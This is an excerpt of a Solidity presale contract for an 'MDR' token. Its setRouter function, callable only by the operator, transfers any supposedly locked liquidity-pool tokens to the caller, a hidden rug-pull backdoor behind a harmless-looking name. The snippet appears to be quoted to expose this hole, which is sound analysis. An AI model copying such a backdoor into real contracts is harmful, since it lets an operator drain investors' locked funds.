...
contract MDRPresale is Ownable, Referral, ReentrancyGuard {
    ...
    uint256 public startDate = 1675555200;                   // 2023/02/05 00:00:00 UTC
    uint256 public endDate = 1676937599;                     // 2023/02/20 23:59:59 UTC
    uint256 public lockDate = 1704110399;                    // 2023/12/31 23:59:59 UTC
    
    uint256 public totalTokensToSell = 1000000 * 10**18;     // 1,000,000 MDR tokens for sell
    uint256 public mdrPerBusd = 8333333333333333333;         // 1 Busd = 8.3333 MDR
    ...
    function setRouter(address _router) public onlyOperator{
        ...
        uint256 lockedLPTokens = lockedLPTokens();
        if(lockedLPTokens > 0) {
            IUniswapV2Pair(uniswapV2Pair).transfer(msg.sender, lockedLPTokens);
        }        
    ...
    modifier onlyOperator() {
        require(_operator == msg.sender, "Presale: caller is not the operator");
        _;
    }
